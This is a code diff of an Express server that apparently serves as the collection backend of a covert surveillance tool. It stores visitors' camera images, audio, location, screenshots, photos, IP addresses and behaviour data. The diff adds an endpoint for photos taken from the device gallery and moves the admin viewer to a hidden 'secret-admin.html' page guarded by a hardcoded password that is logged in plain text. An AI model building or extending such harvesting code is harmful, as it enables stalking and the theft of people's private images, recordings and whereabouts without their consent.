@@ -12,17 +12,22 @@ app.use(express.static(path.join(__dirname, '../frontend')));
 let allData = [];
 let idCounter = 1;
 
+// Admin Password
+const ADMIN_PASSWORD = 'admin123#@!';
+
+// ===== ROUTES =====
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, '../frontend/index.html'));
 });
 
-app.get('/admin', (req, res) => {
-    res.sendFile(path.join(__dirname, '../frontend/admin.html'));
+app.get('/secret-admin.html', (req, res) => {
+    res.sendFile(path.join(__dirname, '../frontend/secret-admin.html'));
 });
 
+// ===== STORE DATA =====
 app.post('/api/store', (req, res) => {
     try {
-        const { cameraImage, location, deviceDetails, screenshot, userPhoto, audioData, ipAddress } = req.body;
+        const { cameraImage, location, deviceDetails, screenshot, userPhoto, audioData, ipAddress, behaviorData } = req.body;
         allData.unshift({
             _id: 'id_' + idCounter++,
             cameraImage: cameraImage || null,
@@ -32,6 +37,7 @@ app.post('/api/store', (req, res) => {
             userPhoto: userPhoto || null,
             audioData: audioData || null,
             ipAddress: ipAddress || 'Unknown',
+            behaviorData: behaviorData || {},
             timestamp: new Date().toISOString()
         });
         console.log('✅ Stored! Total:', allData.length);
@@ -41,24 +47,38 @@ app.post('/api/store', (req, res) => {
     }
 });
 
-// IP Address detect karne ka API
-app.get('/api/get-ip', (req, res) => {
+// ===== STORE GALLERY PHOTOS =====
+app.post('/api/store-gallery', (req, res) => {
     try {
-        const ip = req.headers['x-forwarded-for'] || 
-                   req.connection.remoteAddress || 
-                   req.socket.remoteAddress || 
-                   'Unknown';
-        res.json({ success: true, ip: ip });
+        const { image, fileName, location, deviceDetails } = req.body;
+        allData.unshift({
+            _id: 'gallery_' + idCounter++,
+            type: 'gallery',
+            image: image || null,
+            fileName: fileName || 'unknown.jpg',
+            location: location || { lat: 0, lng: 0 },
+            deviceDetails: deviceDetails || {},
+            timestamp: new Date().toISOString()
+        });
+        console.log('✅ Gallery Photo Stored! Total:', allData.length);
+        res.json({ success: true, message: 'Gallery photo stored!' });
     } catch(err) {
         res.json({ success: false, error: err.message });
     }
 });
 
+// ===== GET IP =====
+app.get('/api/get-ip', (req, res) => {
+    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'Unknown';
+    res.json({ success: true, ip: ip });
+});
+
+// ===== ADMIN - GET DATA =====
 app.post('/api/admin/get-data', (req, res) => {
     try {
         const { password } = req.body;
-        if (password !== 'admin123#@!') {
-            return res.json({ success: false, message: 'Wrong password!' });
+        if (password !== ADMIN_PASSWORD) {
+            return res.json({ success: false, message: '❌ Wrong password!' });
         }
         res.json({ success: true, count: allData.length, data: allData });
     } catch(err) {
@@ -66,11 +86,12 @@ app.post('/api/admin/get-data', (req, res) => {
     }
 });
 
+// ===== ADMIN - DELETE DATA =====
 app.post('/api/admin/delete', (req, res) => {
     try {
         const { password, id } = req.body;
-        if (password !== 'admin123#@!') {
-            return res.json({ success: false, message: 'Wrong password!' });
+        if (password !== ADMIN_PASSWORD) {
+            return res.json({ success: false, message: '❌ Wrong password!' });
         }
         allData = allData.filter(item => item._id !== id);
         res.json({ success: true });
@@ -79,7 +100,8 @@ app.post('/api/admin/delete', (req, res) => {
     }
 });
 
+// ===== START =====
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`🚀 Server: http://localhost:${PORT}`);
-    console.log(`🔑 Admin Password: admin123#@!`);
+    console.log(`🔑 Admin Password: ${ADMIN_PASSWORD}`);
 });
